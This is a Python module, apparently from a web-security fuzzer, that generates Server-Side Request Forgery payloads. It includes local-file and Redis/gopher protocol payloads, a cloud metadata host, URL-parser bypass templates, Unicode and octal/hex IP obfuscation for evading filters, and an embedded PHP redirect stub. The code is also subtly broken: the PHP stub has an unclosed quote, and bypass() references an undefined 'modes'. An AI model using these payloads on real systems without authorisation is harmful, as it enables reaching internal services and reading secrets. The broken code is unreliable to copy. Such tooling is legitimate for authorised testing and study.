#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
from functools import reduce
from saker.fuzzers.fuzzer import Fuzzer

_server = '''
<?php
$scheme = $_GET['s']    ?? 'http';
$ip     = $_GET['ip']   ?? '127.0.0.1';
$port   = $_GET['port'] ?? '80';
$path   = $_GET['path'] ?? '';
$code   = $_GET['code]  ?? 'HTTP/1.1 302 Found';
header($code);
header("Location: $scheme://$ip:$port/$path");
'''


class SSRF(Fuzzer):

    """Server-Side Request Forgery"""

    Unicode = {
        '0': ['⓪', '０', '𝟎', '𝟘', '𝟢', '𝟬', '𝟶', '⁰', '₀'],
        '1': ['①', '１', '𝟏', '𝟙', '𝟣', '𝟭', '𝟷', '¹', '₁'],
        '2': ['②', '２', '𝟐', '𝟚', '𝟤', '𝟮', '𝟸', '²', '₂'],
        '3': ['③', '３', '𝟑', '𝟛', '𝟥', '𝟯', '𝟹', '³', '₃'],
        '4': ['④', '４', '𝟒', '𝟜', '𝟦', '𝟰', '𝟺', '⁴', '₄'],
        '5': ['⑤', '５', '𝟓', '𝟝', '𝟧', '𝟱', '𝟻', '⁵', '₅'],
        '6': ['⑥', '６', '𝟔', '𝟞', '𝟨', '𝟲', '𝟼', '⁶', '₆'],
        '7': ['⑦', '７', '𝟕', '𝟟', '𝟩', '𝟳', '𝟽', '⁷', '₇'],
        '8': ['⑧', '８', '𝟖', '𝟠', '𝟪', '𝟴', '𝟾', '⁸', '₈'],
        '9': ['⑨', '９', '𝟗', '𝟡', '𝟫', '𝟵', '𝟿', '⁹', '₉'],
        '10': ['⑩'],
        '11': ['⑪'],
        '12': ['⑫'],
        '13': ['⑬'],
        '14': ['⑭'],
        '15': ['⑮'],
        '16': ['⑯'],
        '17': ['⑰'],
        '18': ['⑱'],
        '19': ['⑲'],
        '20': ['⑳'],
        '.': ['。', '｡', '．'],
        'a': ['ａ', '𝐚', '𝑎', '𝒂', '𝒶', '𝓪', '𝔞', '𝕒', '𝖆', '𝖺', '𝗮', '𝘢', '𝙖', '𝚊', 'ⓐ', 'Ａ', '𝐀', '𝐴', '𝑨', '𝒜', '𝓐', '𝔄', '𝔸', '𝕬', '𝖠', '𝗔', '𝘈', '𝘼', '𝙰', 'Ⓐ', 'ª', 'ᵃ', 'ₐ', 'ᴬ', '🄰'],
        'b': ['ｂ', '𝐛', '𝑏', '𝒃', '𝒷', '𝓫', '𝔟', '𝕓', '𝖇', '𝖻', '𝗯', '𝘣', '𝙗', '𝚋', 'ⓑ', 'Ｂ', 'ℬ', '𝐁', '𝐵', '𝑩', '𝓑', '𝔅', '𝔹', '𝕭', '𝖡', '𝗕', '𝘉', '𝘽', '𝙱', 'Ⓑ', 'ᵇ', 'ᴮ', '🄱'],
        'c': ['ｃ', 'ⅽ', '𝐜', '𝑐', '𝒄', '𝒸', '𝓬', '𝔠', '𝕔', '𝖈', '𝖼', '𝗰', '𝘤', '𝙘', '𝚌', 'ⓒ', 'Ｃ', 'Ⅽ', 'ℂ', 'ℭ', '𝐂', '𝐶', '𝑪', '𝒞', '𝓒', '𝕮', '𝖢', '𝗖', '𝘊', '𝘾', '𝙲', 'Ⓒ', '🄫', 'ᶜ', '🄲'],
        'd': ['ｄ', 'ⅾ', 'ⅆ', '𝐝', '𝑑', '𝒅', '𝒹', '𝓭', '𝔡', '𝕕', '𝖉', '𝖽', '𝗱', '𝘥', '𝙙', '𝚍', 'ⓓ', 'Ｄ', 'Ⅾ', 'ⅅ', '𝐃', '𝐷', '𝑫', '𝒟', '𝓓', '𝔇', '𝔻', '𝕯', '𝖣', '𝗗', '𝘋', '𝘿', '𝙳', 'Ⓓ', 'ᵈ', 'ᴰ', '🄳'],
        'e': ['ｅ', 'ℯ', 'ⅇ', '𝐞', '𝑒', '𝒆', '𝓮', '𝔢', '𝕖', '𝖊', '𝖾', '𝗲', '𝘦', '𝙚', '𝚎', 'ⓔ', 'Ｅ', 'ℰ', '𝐄', '𝐸', '𝑬', '𝓔', '𝔈', '𝔼', '𝕰', '𝖤', '𝗘', '𝘌', '𝙀', '𝙴', 'Ⓔ', 'ᵉ', 'ₑ', 'ᴱ', '🄴'],
        'f': ['ｆ', '𝐟', '𝑓', '𝒇', '𝒻', '𝓯', '𝔣', '𝕗', '𝖋', '𝖿', '𝗳', '𝘧', '𝙛', '𝚏', 'ⓕ', 'Ｆ', 'ℱ', '𝐅', '𝐹', '𝑭', '𝓕', '𝔉', '𝔽', '𝕱', '𝖥', '𝗙', '𝘍', '𝙁', '𝙵', 'Ⓕ', 'ᶠ', '🄵'],
        'x': ['ｘ', 'ⅹ', '𝐱', '𝑥', '𝒙', '𝓍', '𝔁', '𝔵', '𝕩', '𝖝', '𝗑', '𝘅', '𝘹', '𝙭', '𝚡', 'ⓧ', 'Ｘ', 'Ⅹ', '𝐗', '𝑋', '𝑿', '𝒳', '𝓧', '𝔛', '𝕏', '𝖃', '𝖷', '𝗫', '𝘟', '𝙓', '𝚇', 'Ⓧ', 'ˣ', 'ₓ', '🅇'],
    }

    modes = [
        "http://<fake>&@<real>",
        "http://<real>&@<fake>",
        "http://<fake># @<real>",
        "http://<real># @<fake>",
        "http://<fake>#@<real>",
        "http://<real>#@<fake>",
        "http://foo@<real>:80@<fake>",
    ]

    localpayloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://sudo.cc",  # 127.0.0.1
        "http://127.0.0.1.xip.io",
    ]

    protopayloads = [
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1",
        "ftp://user:pwd@127.0.0.1",
    ]

    cloud_payloads = [
        # k8s
        "http://metadata-db",
    ]

    def __init__(self):
        super(SSRF, self).__init__()

    @classmethod
    def fuzz(cls):
        for p in cls.localpayloads:
            yield p
        for p in cls.protopayloads:
            yield p

    @staticmethod
    def bypass(real, fake="google.com"):
        for m in modes:
            yield m.replace("<real>", real).replace("<fake>", fake)

    @staticmethod
    def ip2oct(ip):
        '''
        >>> SSRF.ip2oct("127.0.0.1")
        '0177.00.00.01'
        '''
        return ".".join(map(lambda i: oct(int(i)), ip.split("."))).replace('o', '')

    @staticmethod
    def ip2hex(ip):
        '''
        >>> SSRF.ip2hex("127.0.0.1")
        '0x7f.0x0.0x0.0x1'
        '''
        return ".".join(map(lambda i: hex(int(i)), ip.split(".")))

    @staticmethod
    def ip2dec(ip):
        '''
        >>> SSRF.ip2dec("127.0.0.1")
        '2130706433'
        '''
        return str(reduce(lambda x, y: (x << 8) + y, map(int, ip.split(".")))).strip("L")

    @staticmethod
    def ip2hexI(ip):
        '''
        >>> SSRF.ip2hexI("127.0.0.1")
        '0x7f000001'
        '''
        return hex(reduce(lambda x, y: (x << 8) + y, map(int, ip.split(".")))).strip("L")

    @staticmethod
    def ip2mix(ip):
        ip = ip.split('.')
        for i in range(len(ip)):
            ip[i] = [SSRF.ip2oct, SSRF.ip2hex][random.randint(0, 1)](ip[i])
        return '.'.join(ip)
